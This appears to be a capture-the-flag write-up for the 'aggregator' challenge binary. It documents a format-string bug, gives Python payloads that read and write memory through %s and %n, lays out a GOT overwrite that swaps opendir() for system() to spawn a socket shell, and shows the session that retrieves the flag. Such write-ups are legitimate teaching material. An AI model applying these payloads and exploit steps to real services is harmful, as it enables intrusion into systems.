# vuln200: aggregator

##Specimen:

```
$ file aggregator
aggregator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, stripped

$ execstack aggregator
- aggregator

```

The binary is a typical forking tcp server.  It displays statistics compiled from video game log files found in child directories of the working directory.

It has four commands:

```
> help
Available commands:
help	-- show this message
quit	-- quit
rating	-- show player rating
summary <player_name>	-- show the main stats of the player
stats <player_name>	-- show all the stats of the player
```

## Vulnerability:

The stats command has a string formatting vulnerability

```
> stats %d:%d:%d:%d:%d:%d:%d:%d:%d:%d
name:	%d:%d:%d:%d:%d:%d:%d:%d:%d:%d
total kills:	0
total deaths:	0
kills to deaths:	0.000000
total playing time:	0.000000 hours
kill top:
0:0:0:0:0:0:0:0:624583717:1680161380




killed by top:
0:0:0:0:0:0:0:0:624583717:1680161380



```

The function `show_stats()` (address `0x0804A361`) supplies user input indirectly into the format parameter of `vsnprintf()`.

```
int __cdecl show_stats(int fd, int a2, int a3, const char *s1)
{
  int result; // eax@4                                                                 
  int v5; // [sp+24h] [bp-184h]@1                                                      
  char dest[32]; // [sp+28h] [bp-180h]@1                                               
  char v7[4]; // [sp+48h] [bp-160h]@1                                                  
  char v8[4]; // [sp+4Ch] [bp-15Ch]@1                                                  
  float v9; // [sp+50h] [bp-158h]@1                                                    
  int v10; // [sp+54h] [bp-154h]@1                                                     
  void *ratings; // [sp+198h] [bp-10h]@1                                               
  int i; // [sp+19Ch] [bp-Ch]@1                                                        

  ratings = get_ratings(a2, a3, (int)&v5);
  sub_8049BA9((int)ratings, v5, s1, dest);
  send_stringf(fd, "name:\t%s\n", dest);
  send_stringf(fd, "total kills:\t%d\n", *(_DWORD *)v7);
  send_stringf(fd, "total deaths:\t%d\n", *(_DWORD *)v8);
  send_stringf(fd, "kills to deaths:\t%f\n", v9);
  send_stringf(fd, "total playing time:\t%f hours\n", (long double)v10 / 3600.0);
  send_stringf(fd, "kill top:\n");
  for ( i = 0; i <= 4; ++i )
  {
    send_stringf(fd, &dest[32 * i + 48]);       // this line is vulnerable
    send_stringf(fd, "\n");
  }
  result = send_stringf(fd, "killed by top:\n");
  for ( i = 0; i <= 4; ++i )
  {
    send_stringf(fd, &dest[32 * i + 208]);      // this line is vulnerable

    result = send_stringf(fd, "\n");
  }
  return result;
}


int send_stringf(int fd, char *format, ...)
{
  size_t v3; // eax@3                                                                  
  char buf[2048]; // [sp+1Ch] [bp-80Ch]@1                                              
  __gnuc_va_list arg; // [sp+81Ch] [bp-Ch]@1                                           
  va_list va; // [sp+838h] [bp+10h]@1                                                  

  va_start(va, format);
  arg = va;
  if ( vsnprintf(buf, 2048u, format, va) > 2000 )
    truncateMessage(buf);
  v3 = strlen(buf);
  return write(fd, buf, v3);
}

```

It's possible to read values from readable memory regions through the `%s` format specifier.  In this example, the address `0x0804AAAA` is the address of the c string "player".

```
$ cat read.py
#!/usr/bin/python
print "stats \xAA\xAA\x04\x08%9$s"

$ ./read.py | nc ubuntu32vm 16711
> name:	�%9$s
total kills:	0
total deaths:	0
kills to deaths:	0.000000
total playing time:	0.000000 hours
kill top:
�player




killed by top:
�player




>

```

It's also possible to write small (< 2000) 32-bit integer values to writable memory regions using the `%n` format specifier.  In this example the value 65 is written to address `0x0804C3E1`.

```
$ cat write.py
#!/usr/bin/python
print "stats \xE1\xC3\x04\x08%61d%9$n"

$ ./write.py | nc ubuntu32vm 16711
> name:	�%61d%9$n
total kills:	0
total deaths:	0
kills to deaths:	0.000000
total playing time:	0.000000 hours
kill top:
�                                                            0




killed by top:
�                                                            0




>


```

By issueing multiple writes at increasing addresses it is possible to write values greater than 2000 to memory.

This example shows what memory looks like when writing the value 0xAABBCCDD to address 0x0000:

* memory before writes:
* * `00000: FF FF FF FF  FF FF FF FF`
* write value 0xDD to address 0x0
* * `00000: DD 00 00 00  FF FF FF FF`
* write value 0xCC to address 0x1
* * `00000: DD CC 00 00  00 FF FF FF`
* write value 0xBB to address 0x2
* * `00000: DD CC BB 00  00 00 FF FF`
* write value 0xAA to address 0x3
* * `00000: DD CC BB AA  00 00 00 FF`



## Exploit

The exploit works by overwriting the `opendir()` record in the GOT with the address of `system()`, then triggering a call to `opendir()` that uses a buffer that can be controlled as the parameter.

Steps to exploit:

1. Disable calls to `opendir()` by writing the value `0` to address `0x0804C4E0`
2. Write the bash command string `"sh 1>&4 0<&4"` to the address `0x0804C3E0`.  This is the buffer that will be passed to `system()` through a call to `opendir()`.
3. Read the `opendir()` record from the GOT, to calculate the address of `system()`
4. Overwrite the `opendir()` record in the GOT with the address of `system()`
5. Enable the call to `opendir()` by writing the value `1` to the address `0x0804C4E0`
6. Trigger the call to `opendir()` by using the command `stats %d`



## Action shot

```
./exploit.py
set count to 0
write shellcode string
find libc base
overwrite opendir got entry with address of system() in libc
Address of system(): 0xF7548A70
set count to 1
TRIGGERING EXPLOIT
INTERACTIVE MODE:

uname -a
Linux vuln1 3.13.5-1-ARCH #1 SMP PREEMPT Sun Feb 23 00:25:24 CET 2014 x86_64 GNU/Linux

cat /proc/version
Linux version 3.13.5-1-ARCH (nobody@var-lib-archbuild-extra-x86_64-thomas) (gcc version 4.8.2 20140206 (prerelease) (GCC) ) #1 SMP PREEMPT Sun Feb 23 00:25:24 CET 2014


ls -alF
total 32
dr-x------ 4 aggregator aggregator  4096 Mar  8 16:43 ./
dr-xr-xr-x 5 root       root        4096 Mar  8 19:26 ../
-r-x------ 1 aggregator aggregator 14948 Mar  8 16:43 aggregator*
dr-x------ 2 aggregator aggregator  4096 Mar  8 16:43 ctf/
dr-x------ 2 aggregator aggregator  4096 Mar  8 16:43 sniperserver/

ls -alF ctf
total 24
dr-x------ 2 aggregator aggregator  4096 Mar  8 16:43 ./
dr-x------ 4 aggregator aggregator  4096 Mar  8 16:43 ../
-r-------- 1 aggregator aggregator 14103 Mar  8 16:43 Real.ngLog.2012.07.42.42.42.24.7777.log

cat ctf/Real.ngLog.2012.07.42.42.42.24.7777.log | grep RUCTF_
0.59    player  Connect RUCTF_5b75086a  0   False
```




